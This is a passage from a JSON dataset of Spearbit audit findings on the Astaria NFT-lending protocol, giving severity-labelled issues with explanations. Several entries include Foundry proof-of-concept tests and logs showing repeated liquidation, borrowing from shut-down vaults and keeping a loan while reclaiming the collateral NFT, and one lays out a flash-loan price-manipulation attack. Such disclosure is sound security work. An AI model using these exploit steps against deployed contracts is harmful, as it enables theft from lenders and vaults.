        "body": "The current implementation of the protocol does not have any safeguard around calling Astari- aRouter.liquidate(...) only once for an expired stack/lien. Thus, when a lien expires, multiple adversaries can override many different parameters by calling this endpoint at will in the same block or different blocks till one of the created auctions settles (which might not as one can keep stacking these auctions with some delays to have a never-ending liquidation flow). Here is the list of storage parameters that can be manipulated:  s.collateralLiquidator[stack.lien.collateralId].amountOwed in LienToken: it is possible to keep in- creasing this value if we stack calls to the liquidate(...) with delays.  s.collateralLiquidator[stack.lien.collateralId].liquidator in LienToken: This can be overwritten and would hold the last liquidator's address and so only this liquidator can claim the NFT if the auction its corresponding auction does not settle and also it would receive the liquidation fees.  s.idToUnderlying[params.collateralId].auctionHash in CollateralToken: would hold the last created auction's order hash for the same expired lien backed by the same collateral.  slope in PublicVault: If the lien is taken from a public vault, each call to liquidate(...) would reduce this value. So we can make this slope really small.  s.epochData[epoch].liensOpenForEpoch in PublicVault: If the lien is taken from a public vault, each call to liquidate(...) would reduce this value. So we can make this slope really small or even 0 depends on the rate of this lien and the slope of the vault due to arithmetic underflows.  yIntercept in PublicVault: Mixing the manipulation of the vault's slope and stacking the calls to liqui- date(...) with delays we can also manipulate yIntercept. // add the following test case to: // file: src/test/LienTokenSettlementScenarioTest.t.sol function testScenario8() public { TestNFT nft = new TestNFT(2); address tokenContract = address(nft); uint256 tokenIdOne = uint256(0); uint256 tokenIdTwo = uint256(1); uint256 initialBalance = WETH9.balanceOf(address(this)); // create a PublicVault with a 14-day epoch address publicVault = _createPublicVault( strategistOne, strategistTwo, 14 days, 1e17 ); // lend 20 ether to the PublicVault as address(1) _lendToVault( Lender({addr: address(1), amountToLend: 20 ether}), payable(publicVault) ); uint256 vaultShares = PublicVault(payable(publicVault)).totalSupply(); // borrow 10 eth against the dummy NFT with tokenId 0 (, ILienToken.Stack memory stackOne) = _commitToLien({ vault: payable(publicVault), strategist: strategistOne, strategistPK: strategistOnePK, tokenContract: tokenContract, tokenId: tokenIdOne, lienDetails: ILienToken.Details({ 10 maxAmount: 50 ether, rate: (uint256(1e16) * 150) / (365 days), duration: 10 days, maxPotentialDebt: 0 ether, liquidationInitialAsk: 100 ether }), amount: 10 ether }); // borrow 10 eth against the dummy NFT with tokenId 1 (, ILienToken.Stack memory stackTwo) = _commitToLien({ vault: payable(publicVault), strategist: strategistOne, strategistPK: strategistOnePK, tokenContract: tokenContract, tokenId: tokenIdTwo, lienDetails: ILienToken.Details({ maxAmount: 50 ether, rate: (uint256(1e16) * 150) / (365 days), duration: 10 days, maxPotentialDebt: 0 ether, liquidationInitialAsk: 100 ether }), amount: 10 ether }); uint256 collateralIdOne = tokenContract.computeId(tokenIdOne); uint256 collateralIdTwo = tokenContract.computeId(tokenIdTwo); // verify the strategist has no shares minted assertEq( PublicVault(payable(publicVault)).balanceOf(strategistOne), 0, \"Strategist has incorrect share balance\" ); // verify that the borrower has the CollateralTokens assertEq( COLLATERAL_TOKEN.ownerOf(collateralIdOne), address(this), \"CollateralToken not minted to borrower\" ); assertEq( COLLATERAL_TOKEN.ownerOf(collateralIdTwo), address(this), \"CollateralToken not minted to borrower\" ); // fast forward to the end of the lien one vm.warp(block.timestamp + 10 days); address liquidatorOne = vm.addr(0x1195da7051); address liquidatorTwo = vm.addr(0x1195da7052); vm.label(liquidatorOne, \"liquidator 1\"); vm.label(liquidatorTwo, \"liquidator 2\"); // liquidate the first lien vm.startPrank(liquidatorOne); OrderParameters memory listedOrder = _liquidate(stackOne); vm.stopPrank(); 11 assertEq( LIEN_TOKEN.getAuctionLiquidator(collateralIdOne), liquidatorOne, \"liquidator is not stored in s.collateralLiquidator[collateralId]\" ); // // liquidate the first lien with a different liquidator vm.startPrank(liquidatorTwo); listedOrder = _liquidate(stackOne); vm.stopPrank(); assertEq( LIEN_TOKEN.getAuctionLiquidator(collateralIdOne), liquidatorTwo, \"liquidator is not stored in s.collateralLiquidator[collateralId]\" ); // validate the slope is updated twice for the same expired lien // and so the accounting for the public vault is manipulated assertEq( PublicVault(payable(publicVault)).getSlope(), 0, \"PublicVault slope divergent\" ); // publicVault.storageSlot.epochData[epoch].liensOpenForEpoch is also dfecremented twice // CollateralToken.storageSlot.idToUnderlying[params.collateralId].auctionHash can also be ,! manipulated }",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "maxStrategistFee is incorrectly set in AstariaRouter's constructor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "In AstariaRouter's constructor we set the maxStrategistFee as s.maxStrategistFee = uint256(50e17); // 5e18 But in the filing route we check that this value should not be greater than 1e18. 12 maxStrategistFee is supposed to set an upper bound for public vaults's strategist vault fee. When a payment is made for a lien, one calculates the shares to be minted for the strategist based on this value and the interest amount paid: function _handleStrategistInterestReward( VaultData storage s, uint256 interestPaid ) internal virtual { if (VAULT_FEE() != uint256(0) && interestPaid > 0) { uint256 fee = interestPaid.mulWadDown(VAULT_FEE()); uint256 feeInShares = convertToShares(fee); _mint(owner(), feeInShares); } } Note that we are using mulWadDown(...) here: F = j I (cid:1) f 1018k parameter description F f I fee VAULT_FEE() interestPaid so we would want f (cid:20) 1018. Currently, a vault could charge 5 times the interest paid.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "When a vault is shutdown a user can still commit to liens using the vault",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "When a vault is shutdown, one should not be able to take more liens using the funds from this vault. In the commit to lien flow, AstariaRouter fetches the state of the vault 13 ( , address delegate, address owner, , , // s.isShutdown uint256 nonce, bytes32 domainSeparator ) = IVaultImplementation(c.lienRequest.strategy.vault).getState(); But does not use the s.isShutdown flag to stop the flow if it is set to true. When a vault is shutdown we should have: vault endpoint reverts should revert deposit mint redeem withdraw redeemFutureEpoch payment flows liquidation flows commitToLien YES YES NO NO NO NO NO YES // add this test case to // file: src/test/LienTokenSettlementScenarioTest.t.sol // Scenario 12: create vault > shutdown > commitToLien function testScenario12() public { { console2.log(\"--- test private vault shutdown ---\"); uint256 ownerPK = uint256(0xa77ac3); address owner = vm.addr(ownerPK); vm.label(owner, \"owner\"); uint256 lienId; TestNFT nft = new TestNFT(1); address tokenContract = address(nft); uint256 tokenId = uint256(0); address privateVault = _createPrivateVault(owner, owner); vm.label(privateVault, \"privateVault\"); console2.log(\"[+] private vault is created: %s\", privateVault); // lend 1 wei to the privateVault _lendToPrivateVault( PrivateLender({addr: owner, amountToLend: 1 wei, token: address(WETH9)}), payable(privateVault) ); console2.log(\"[+] lent 1 wei to the private vault.\"); console2.log(\"[+] shudown private vault.\"); 14 vm.startPrank(owner); Vault(payable(privateVault)).shutdown(); vm.stopPrank(); assertEq( Vault(payable(privateVault)).getShutdown(), true, \"Private Vault should be shutdown.\" ); // borrow 1 wei against the dummy NFT (lienId, ) = _commitToLien({ vault: payable(privateVault), strategist: owner, strategistPK: ownerPK, tokenContract: tokenContract, tokenId: tokenId, lienDetails: ILienToken.Details({ maxAmount: 1 wei, rate: 1, duration: 1 hours, maxPotentialDebt: 0 ether, liquidationInitialAsk: 1 ether }), amount: 1 wei, revertMessage: \"\" }); console2.log(\"[+] borrowed 1 wei against the private vault.\"); lienId: %s\", lienId); console2.log(\" owner of lienId: %s\\n\\n\", LIEN_TOKEN.ownerOf(lienId)); console2.log(\" assertEq( LIEN_TOKEN.ownerOf(lienId), owner, \"owner should be the owner of the lienId.\" ); } { console2.log(\"--- test public vault shutdown ---\"); uint256 ownerPK = uint256(0xa77ac322); address owner = vm.addr(ownerPK); vm.label(owner, \"owner\"); uint256 lienId; TestNFT nft = new TestNFT(1); address tokenContract = address(nft); uint256 tokenId = uint256(0); address publicVault = _createPublicVault(owner, owner, 14 days); vm.label(publicVault, \"publicVault\"); console2.log(\"[+] public vault is created: %s\", publicVault); // lend 1 wei to the publicVault _lendToVault( Lender({addr: owner, amountToLend: 1 ether}), payable(publicVault) ); 15 console2.log(\"[+] lent 1 ether to the public vault.\"); console2.log(\"[+] shudown public vault.\"); vm.startPrank(owner); Vault(payable(publicVault)).shutdown(); vm.stopPrank(); assertEq( Vault(payable(publicVault)).getShutdown(), true, \"Public Vault should be shutdown.\" ); // borrow 1 wei against the dummy NFT (lienId, ) = _commitToLien({ vault: payable(publicVault), strategist: owner, strategistPK: ownerPK, tokenContract: tokenContract, tokenId: tokenId, lienDetails: ILienToken.Details({ maxAmount: 1 wei, rate: 1, duration: 1 hours, maxPotentialDebt: 0 ether, liquidationInitialAsk: 1 ether }), amount: 1 wei, revertMessage: \"\" }); console2.log(\"[+] borrowed 1 wei against the public vault.\"); console2.log(\" console2.log(\" lienId: %s\", lienId); owner of lienId: %s\", LIEN_TOKEN.ownerOf(lienId)); assertEq( LIEN_TOKEN.ownerOf(lienId), publicVault, \"Public vault should be the owner of the lienId.\" ); } } forge t --mt testScenario12 --ffi -vvv: 16 --- test private vault shutdown --- [+] private vault is created: 0x7BF14E2ad40df80677D356099565a08011B72d66 [+] lent 1 wei to the private vault. [+] shudown private vault. [+] borrowed 1 wei against the private vault. lienId: 78113226609386929237635937490344951966356214732432064308195118046023211325984 owner of lienId: 0x60873Bc6F2C9333b465F60e461cf548EfFc7E6EA --- test public vault shutdown --- [+] public vault is created: 0x5b1A54d097AA8Ce673b6816577752F6dfc10Ddd6 [+] lent 1 ether to the public vault. [+] shudown public vault. [+] borrowed 1 wei against the public vault. lienId: 13217102800774263219074199159187108198090219420208960450275388834853683629020 owner of lienId: 0x5b1A54d097AA8Ce673b6816577752F6dfc10Ddd6",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "transfer(...) function in _issuePayout(...) can be replaced by a direct call",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "In the _issuePayout(...) internal function of the VaultImplementation if the asset is WETH the amount is withdrawn from WETH to native tokens and then transfered to the borrower: if (asset() == WETH()) { IWETH9 wethContract = IWETH9(asset()); wethContract.withdraw(newAmount); payable(borrower).transfer(newAmount); } transfer limits the amount of gas shared to the call to the borrower which would prevent executing a complex callback and due to changes in gas prices in EVM it might even break some feature for a potential borrower contract. For the analysis of the flow for both types of vaults please refer to the following issue:  'Storage parameters are updated after a few callback sites to external addresses in the commitToLien(...) flow'",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Storage parameters are updated after a few callback sites to external addresses in the commit- ToLien(...) flow",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "In the commitToLien(...) flow the following storage parameters are updated after some of the external call back sites when payout is issued or a lien is transferred from a private vault to its owner: 26  collateralStateHash in LienToken: One can potentially re-enter to take another lien using the same col- lateral, but this is not possible since the collateral NFT token is already transferred to the CollateralToken (unless one is dealing with some esoteric NFT token). The createLien(...) requires this parameter to be 0., and that's why a potential re-entrancy can bypass this requirement. | Read re-entrancy: Yes  slope in PublicVault: - | Read re-entrancy: Yes  liensOpenForEpoch in PublicVault: If flash liens are allowed one can re-enter and process the epoch before finishing the commitToLien(...). And so the processed epoch would have open liens even though we would want to make sure this could not happen | Read re-entrancy: Yes The re-entrancies can happen if the vault asset performs a call back to the receiver when transferring tokens (during issuance of payouts). And if one is dealing with WETH, the native token amount is transfer(...) to the borrower. Note in the case of Native tokens if the following recommendation from the below issue is considered the current issue could be of higher risk:  'transfer(...) function in _issuePayout(...) can be replaced by a direct call'",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "UNI_V3Validator fetches spot prices that may lead to price manipulation attacks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "UNI_V3Validator.validateAndParse() checks the state of the Uniswap V3 position. This includes checking the LP value through LiquidityAmounts.getAmountsForLiquidity. //get pool state //get slot 0 (uint160 poolSQ96, , , , , , ) = IUniswapV3PoolState( V3_FACTORY.getPool(token0, token1, fee) ).slot0(); (uint256 amount0, uint256 amount1) = LiquidityAmounts .getAmountsForLiquidity( poolSQ96, TickMath.getSqrtRatioAtTick(tickLower), TickMath.getSqrtRatioAtTick(tickUpper), liquidity );  LiquidityAmounts.sol#L177-L221 When we deep dive into getAmountsForLiquidity, we see three cases. Price is below the range, price is within the range, and price is above the range. 28 function getAmountsForLiquidity( uint160 sqrtRatioX96, uint160 sqrtRatioAX96, uint160 sqrtRatioBX96, uint128 liquidity ) internal pure returns (uint256 amount0, uint256 amount1) { unchecked { if (sqrtRatioAX96 > sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96); if (sqrtRatioX96 <= sqrtRatioAX96) { amount0 = getAmount0ForLiquidity( sqrtRatioAX96, sqrtRatioBX96, liquidity ); } else if (sqrtRatioX96 < sqrtRatioBX96) { amount0 = getAmount0ForLiquidity( sqrtRatioX96, sqrtRatioBX96, liquidity ); amount1 = getAmount1ForLiquidity( sqrtRatioAX96, sqrtRatioX96, liquidity ); } else { amount1 = getAmount1ForLiquidity( sqrtRatioAX96, sqrtRatioBX96, liquidity ); } } } For simplicity, we can break into getAmount1ForLiquidity 29 /// @notice Computes the amount of token1 for a given amount of liquidity and a price range /// @param sqrtRatioAX96 A sqrt price representing the first tick boundary /// @param sqrtRatioBX96 A sqrt price representing the second tick boundary /// @param liquidity The liquidity being valued /// @return amount1 The amount of token1 function getAmount1ForLiquidity( uint160 sqrtRatioAX96, uint160 sqrtRatioBX96, uint128 liquidity ) internal pure returns (uint256 amount1) { unchecked { if (sqrtRatioAX96 > sqrtRatioBX96) (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96); return FullMathUniswap.mulDiv( liquidity, sqrtRatioBX96 - sqrtRatioAX96, FixedPoint96.Q96 ); } } is calculated as amount = liquidity * (upper price - lower price). When the We find the amount slot0.poolSQ96 is in lp range, the lower price is the slot0.poolSQ96, the closer slot0 is to lowerTick, the smaller the amount1 is. This is vulnerable to price manipulation attacks as IUniswapV3PoolState.slot0.poolSQ96 is effectively the spot price. Attackers can acquire huge funds through flash loans and shift theslot0 by doing large swaps on Uniswap. Assume the following scenario, the strategist sign a lien that allows the borrower to provide ETH-USDC position with > 1,000,000 USDC and borrow 1,000,000 USDC from the vault.  Attacker can first provides 1 ETH worth of lp at price range 2,000,000 ~ 2,000,001.  The attacker borrows flash loan to manipulate the price of the pool and now the slot0.poolSQ96 = sqrt(2,000,000). (ignoring the decimals difference.  getAmountsForLiquidity value the LP positions with the spot price, and find the LP has 1 * 2,000,000 USDC in the position. The attacker borrows 2,000,000  Restoring the price of Uniswap pool and take the profit to repay the flash loan. Note that the project team has stated clearly that UNI_V3Validator will not be used before the audit. This issue is filed to provide information to the codebase.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Users pay protocol fee for interests they do not get",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The PublicVault._handleStrategistInterestReward() function currently charges a protocol fee from minting vault shares, affecting all vault LP participants. However, not every user receives interest payments. Consequently, a scenario may arise where a user deposits funds into the PublicVault before a loan is repaid, resulting in the user paying more in protocol fees than the interest earned. This approach appears to be unfair to certain users, leading to a disproportionate fee structure for those who do not benefit from the interest rewards.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Seaport auctions not compatible with USDT",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "As per ERC20 specification, approve() returns a boolean function approve(address _spender, uint256 _value) public returns (bool success) However, USDT deviates from this standard and it's approve() method doesn't have a return value. Hence, if USDT is used as a payment token, the following line reverts in validateOrder() as it expects return data but doesn't receive it: paymentToken.approve(address(transferProxy), s.LIEN_TOKEN.getOwed(stack));",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Borrowers cannot provide slippage protection parameters when committing to a lien",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "When a borrower commits to a lien, AstariaRouter calls the strategy validator to fetch the lien details (bytes32 leaf, ILienToken.Details memory details) = IStrategyValidator( strategyValidator ).validateAndParse( commitment.lienRequest, msg.sender, commitment.tokenContract, commitment.tokenId ); details include rate, duration, liquidationInitialAsk: struct Details { uint256 maxAmount; uint256 rate; //rate per second uint256 duration; uint256 maxPotentialDebt; // not used anymore uint256 liquidationInitialAsk; } The borrower cannot provide slippage protection parameters to make sure these 3 values cannot enter into some undesired ranges.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The liquidation's auction starting price is not chosen perfectly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "When a lien is expired and liquidated the starting price for its Seaport auction is chosen as stack.lien.details.liquidationInitialAs. It would make more sense to have the startingPrice to be the maximum of the amount owed up to now and the stack.lien.details.liquidationInitialAsk ps = max(Lin, aowed ) For example if the liquidate(...) endpoint is called way after the lien's expiration time the amount owed might be bigger than the stack.lien.details.liquidationInitialAsk. When a lien is created the protocol checks that stack.lien.details.liquidationInitialAsk is not smaller than the to-be-owed amount at the end of the lien's term. But the lien can keep accruing interest if it is not liquidated right away when it gets expired.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Canceled Seaport auctions can still be claimed by the liquidator",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Canceled auctions can still be claimed by the liquidator if ( s.idToUnderlying[collateralId].auctionHash != s.SEAPORT.getOrderHash(getOrderComponents(params, counterAtLiquidation)) ) { //revert auction params don't match revert InvalidCollateralState( InvalidCollateralStates.INVALID_AUCTION_PARAMS ); } If in the future we would add an authorised endpoint that could call s.SEAPORT.incrementCounter() to cancel all outstanding NFT auctions, the liquidator can call this endpoint liquidatorNFTClaim(..., counterAtLiq- uidation) where counterAtLiquidation is the old counter to claim its NFT after the canceled Seaport auction ends.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The risk of bad debt is transferred to the non-redeeming shareholders and not the redeeming holders",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Right before a successful epochProcess(), the total assets A equals to + P(s,tl )2U2 a(s, tl ) A = y0 + s(t (cid:0) tlast ) = B + a(s, t) X s2U1 All the parameter values in the below table are considered as just before calling the processEpoch() endpoint unless stated otherwise.  A | totalAssets() |  y0 | yIntercept |  s | slope |  tlast | lasttimestamp used to update y0 or s |  t | block.timestamp |  B | ERC20(asset()).balanceOf(PublicVault), underlying balance of the public vault |  U1 | The set of active liens/stacks owned by the PublicVault, this can be non-empty due to how long the lien durations can be |  U2 | The set of liquidated liens/stacks and their corresponding liquidation timestamp ( tl ) which are owned by the current epoch's WithdrawProxy Wecurr . These liens belong to the current epoch, but their auction ends in the next epoch duration. |  a(s, t) | total amount owned by the stack s up to the timestamp t.  S | totalSupply().  SW | number of shares associated with the current epoch's WithdrawProxy ,currentWithdrawProxy.totalSupply() |  E | currentWithdrawProxy.getExpected(). 35 0 | yIntercept after calling epochProcess().  wr | withdrawReserve this is the value after calling epochProcess().  y 0  tp | last after calling epochProcess().  A0 | totalAssets after calling epochProcess().  Wn | the current epoch's WithdrawProxy before calling epochProcess().  Wn+1 | the current epoch's WithdrawProxy after calling epochProcess(). Also assume that claim() was already called on the previous epoch's WithdrawProxy if needed. After the call to epochProcess() (in the same block), we would have roughly (not considering the division errors) A0 = y 0 0 + s(t (cid:0) tp) A0 = (1 (cid:0) SW S )A + X s2U1 (a(s, t) (cid:0) a(s, tp)) wr = ( SW S ) B + a(s, tp) X s2U1 A = A0 + wr + ( SW S ) X (s,tl )2U2 a(s, tl ) (cid:0)(cid:1)A = wr + ( SW S )E and so: To be able to call processEpoch() again we need to make sure wr tokens have been transferred to Wn either from the public vault's assets B or from Wn+1 assets. Note that at this point wr equals to wr = SW S B + SW S X s2U1 a(s, tp) SW S B is an actual asset and can be transferred to Wn right away. The The a(s, tp) portion is a percentage of the amount owed by active liens at the time the processEpoch() was called. Depending on whether these liens get paid fully or not we would have: SW S Ps2U1  If they get fully paid there are no risks for the future shareholders to bare.  If these liens are not fully paid since we have transferred a(s, tp) from the actual asset balance to Wn the redeeming shareholder would not take the risk of these liens getting liquidated for less than their value. But these risks are transferred to the upcoming shareholders or the shareholders who have not redeemed their positions yet. SW S Ps2U1",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "validateOrder(...) does not check the consideration amount against its token balance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "When a lien position gets liquidated the CollateralToken creates a full restricted Seaport auction with itself as both the offerer and the zone. This will cause Seaport to do a callback to the CollateralToken's validateOrder(...) endpoint at the end of order fulfilment/matching. In this endpoint we have: uint256 payment = zoneParameters.consideration[0].amount; This payment amount is not validated.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "If the auction window is 0, the borrower can keep the lien amount and also take back its collater- alised NFT token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "If an authorised entity would file to set the auctionWindow to 0, borrowers can keep their lien amount and also take back their collateralised NFT tokens. Below is how this type of vulnerability works. 1. A borrower takes a lien from a vault by collateralising its NFT token. 2. Borrower let the time pass so that its lien/stack position can be liquidated. 3. The borrower atomically liquidates and then calls the liquidatorNFTClaim(...) endpoint of the Collater- alToken. The timestamps are as follows: s (cid:20) t lien t lien e = t auction s = t auction e We should note that in step 3 above when the borrower liquidates its own position, the CollateralToken creates a Seaport auction by calling its validate(...) endpoint. But this endpoint does not validate the orders timestamps so even though the timestamps provided are not valid when one tries to fulfil/match the order since Seaport requires that t auction . Thus, in . So it is not possible to fulfil/match an order where t auction (cid:20) tnow < t auction = t auction e e s s 37 step 3 it is not needed to call liquidatorNFTClaim(...) immediately as the auction created cannot be fulfilled by anyone. // add the following test case to // file: src/test/LienTokenSettlementScenarioTest.t.sol function _createUser(uint256 pk, string memory label) internal returns(address addr) { uint256 ownerPK = uint256(pk); addr = vm.addr(ownerPK); vm.label(addr, label); } function testScenario14() public { // allow flash liens - liens that can be liquidated in the same block that was committed IAstariaRouter.File[] memory files = new IAstariaRouter.File[](1); files[0] = IAstariaRouter.File( IAstariaRouter.FileType.AuctionWindow, abi.encode(uint256(0)) ); ASTARIA_ROUTER.fileBatch(files); console2.log(\"[+] set auction window to 0.\"); { } { address borrower1 = _createUser(0xb055033501, \"borrower1\"); address vaultOwner = _createUser(0xa77ac3, \"vaultOwner\"); address publicVault = _createPublicVault(vaultOwner, vaultOwner, 14 days); vm.label(publicVault, \"publicVault\"); console2.log(\"[+] public vault is created: %s\", publicVault); console2.log(\"vault start: %s\", IPublicVault(publicVault).START()); skip(14 days); _lendToVault( Lender({addr: vaultOwner, amountToLend: 10 ether}), payable(publicVault) ); TestNFT nft1 = new TestNFT(1); address tokenContract1 = address(nft1); uint256 tokenId1 = uint256(0); nft1.transferFrom(address(this), borrower1, tokenId1); vm.startPrank(borrower1); (uint256 lienId,ILienToken.Stack memory stack) = _commitToLien({ vault: payable(publicVault), strategist: vaultOwner, strategistPK: 0xa77ac3, tokenContract: tokenContract1, tokenId: tokenId1, lienDetails: ILienToken.Details({ maxAmount: 2 ether, rate: 1e8, duration: 1 hours, maxPotentialDebt: 0 ether, liquidationInitialAsk: 10 ether }), amount: 2 ether, 38 revertMessage: \"\" }); console2.log(\"ETH balance of the borrower: %s\", borrower1.balance); skip(1 hours); console2.log(\"[+] lien created with 0 duration. lineId: %s\", lienId); OrderParameters memory params = _liquidate(stack); console2.log(\"[+] lien liquidated by the borrower.\"); COLLATERAL_TOKEN.liquidatorNFTClaim( stack, params, COLLATERAL_TOKEN.SEAPORT().getCounter(address(COLLATERAL_TOKEN)) ); console2.log(\"[+] liquidator/borrower claimed NFT.\\n\"); vm.stopPrank(); console2.log(\"owner of the NFT token: %s\", nft1.ownerOf(tokenId1)); console2.log(\"ETH balance of the borrower: %s\", borrower1.balance); assertEq( nft1.ownerOf(tokenId1), borrower1, \"the borrower should own the NFT\" ); assertEq( borrower1.balance, 2 ether, \"borrower should still have the lien amount.\" ); } } forge t --mt testScenario14 --ffi -vvv: [+] set auction window to 0. [+] public vault is created: 0x4430c0731d87768Bf65c60340D800bb4B039e2C4 vault start: 1 ETH balance of the borrower: 2000000000000000000 [+] lien created with 0 duration. lineId: ,! [+] lien liquidated by the borrower. [+] liquidator/borrower claimed NFT. 91310819262208864484407122336131134788367087956387872647527849353935417268035 owner of the NFT token: 0xA92D072d39E6e0a584a6070a6dE8D88dfDBae2C7 ETH balance of the borrower: 2000000000000000000",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "An owner might not be able to cancel all signed liens by calling incrementNonce()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "If the vault owner or the delegate is phished into signing terms with consecutive nonces in a big range, they would not be able to cancel all those terms with the current incrementNonce() implementation as this value is only incrementing the nonce one at a time. As an example Seaport increments their counters using the following formula n += blockhash(block.number - 1) << 0x80;",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Error handling for USDT transactions in TransferProxy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "To handle edge cases where the receiver is blacklisted, TransferProxy.tokenTransferFromWithErrorReceiver(...) is designed to catch errors that may occur during the first transfer attempt and then proceed to send the tokens to the error receiver. try ERC20(token).transferFrom(from, to, amount) {} catch { _transferToErrorReceiver(token, from, to, amount); } However, it's worth noting that this approach may not be compatible with non-standard ERC20 tokens (e.g., USDT) that do not return any value after a transferFrom operation. The try-catch pattern in Solidity can only catch errors resulting from reverted external contract calls, but it does not handle errors caused by inconsistent return values. Consequently, when using USDT, the entire transaction will revert.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "PublicVault does not handle funds in errorReceiver",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "involves PROXY.tokenTransferFromWithErrorReceiver. The implementation in the TransferProxy contract involves sending the tokens to an error receiver that is con- trolled by the original receiver. However, this approach can lead to accounting errors in the PublicVault as PublicVault does not pull tokens from the error receiver. process transferProxy.TRANSFER_- LienToken.MakePayment(...), function from the in the tokens using user the to function tokenTransferFromWithErrorReceiver( // ... ) { try ERC20(token).transferFrom(from, to, amount) {} catch { _transferToErrorReceiver(token, from, to, amount); } } Note that, in practice, tokens would not be transferred to the error receiver. The issue is hence considered to be a low-risk issue.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Inconsistent Vault Fee Charging during Loan Liquidation via WithdrawProxy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "In the smart contract code of PublicVault, there is an inconsistency related to the charging of fees when a loan is liquidated at epoch's roll and the lien is sent to WithdrawProxy. The PublicVault.owner is supposed to take a ratio of the interest paid as the strategist's reward, and the fee should be charged when a payment is made in the function PublicVault.updateVault(...), regardless of whether it's a normal payment or a liquidation payment. It appears that the fee is not being charged when a loan is liquidated at epoch's roll and the lien is sent to With- drawProxy. This discrepancy could potentially lead to an inconsistent distribution of fees and rewards.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "VaultImplementation.init(...) silently initialised when the allowlist parameters are not throughly validated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "In VaultImplementation.init(...), if params.allowListEnabled is false but params.allowList is not empty, s.allowList does not get populated.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Several functions in AstariaRouter can be made non-payable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Following functions in AstariaRouter are payable when they should never be sent the native token: mint(), deposit(), withdraw(), redeem(), pullToken()",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Loan duration can be reduced at the time of borrowing without user permission",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Requested loan duration, if greater than the maximum allowed duration (the time to next epoch's end), is set to this maximum value: if (timeToSecondEpochEnd < lien.details.duration) { lien.details.duration = timeToSecondEpochEnd; } This happens without explicit user permission.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Native tokens sent to DepositHelper can get locked",
